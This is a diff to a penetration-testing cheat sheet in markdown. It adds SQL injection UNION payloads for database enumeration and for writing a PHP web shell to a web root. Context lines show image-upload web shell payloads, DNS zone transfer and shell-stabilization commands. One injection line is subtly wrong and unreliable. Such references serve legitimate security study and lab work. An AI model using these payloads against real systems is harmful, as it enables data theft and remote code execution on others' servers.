@@ -1,6 +1,6 @@
 # Linux Pentesting Cheat Sheet
 
-##  
+##  User Access
 
 ### Port Scanning
 
@@ -20,6 +20,33 @@
 
 
 ### Web
+
+#### SQL Injection
+Insert SQL payloads in input fields to extract data from the database.
+
+- `UNION SELECT 1,2,3 --`
+    - To know the number of columns the query returns, increment the number until no error is returned.
+
+- `UNION SELECT database() --`
+    - To get the current database name.
+
+- `UNION SELECT schema_name FROM information_schema.schemata --`
+    - To get the database names.
+
+- `UNION SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASE_NAME' --`
+    - To get the table names in the current database.
+
+- `UNION SELECT column_name FROM information_schema.columns WHERE table_schema='DATABASE_NAME' AND table_name='TABLE_NAME' --`
+    - To get the column names in a specific table.
+
+- `UNION SELECT group_concat(column_name,0x3a,column_name) FROM 'DATABASE_NAME'.'TABLE_NAME' --`
+    - To get the first 10 rows of data from specific columns in a specific table.
+
+- `UNION SELECT "<?php ... ?>" INTO OUTFILE '/var/www/html/shell.php' --`
+    - To write a web shell to the server (requires FILE privilege and writable directory).
+
+
+![](2025-09-30-18-17-53.png)![](content/2025-09-30-18-18-46.png)![](content/cheatsheet/2025-09-30-18-20-10.png)
 
 #### Directory Listing
 
@@ -86,7 +113,7 @@
 
 ##### Image Upload Vulnerability
 - Add a PHP payload to an image file `<?php system($_GET['cmd']);?>`
-- Add `pre` tags to the payload to avoid corruption `<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>` 
+- Add `pre` tags to the payload to avoid corruption `<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>`
 
 - ¿¿¿??? Use `exiftool` to add the PHP payload to the image file without corrupting it:
     - `exiftool -Comment='<?php system($_GET["cmd"]);?>' image.jpg`
@@ -135,7 +162,7 @@ This is a Spring Boot feature that provides endpoints for monitoring and managin
     - To stop VPN `systemctl stop openvpn`
     - To start VPN `systemctl start openvpn`
 
-### DNS 
+### DNS
 - Perform DNS zone transfer `dig axfr @TARGET_IP DOMAIN`
     - To specify a different port `-p PORT`
     - To use TCP instead of UDP `+tcp`
@@ -190,7 +217,7 @@ This is a Spring Boot feature that provides endpoints for monitoring and managin
     - To list tables in the current database `\dt`
     - To describe a table `\d TABLE`
     - To execute a query `SELECT * FROM TABLE;`
-    - To exit PostgreSQL `\q`   
+    - To exit PostgreSQL `\q`
 
 #### MongoDB
 - Connect to MongoDB server `mongo --host TARGET_IP --port PORT -u USERNAME -p PASSWORD --authenticationDatabase DATABASE`
@@ -222,10 +249,10 @@ This is a Spring Boot feature that provides endpoints for monitoring and managin
 - Python 2 `python -c 'import pty;pty.spawn("/bin/bash")'`
 - Python 3 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 - Perl `perl -e 'exec "/bin/sh";'`
-- Bash  
+- Bash
     ```bash
     script /dev/null -c bash
-    stty raw -echo; fg 
+    stty raw -echo; fg
     reset xterm
     export SHELL=bash
     export TERM=xterm-256color
@@ -308,7 +335,7 @@ done;
 Transpile Java bytecode back into readable Java source code using one of the following tools:
 - `jd-gui` (GUI application)
 - `cfr` (command line tool)
-- `http://www.javadecompilers.com/` 
+- `http://www.javadecompilers.com/`
 
 ### Hash Cracking
 
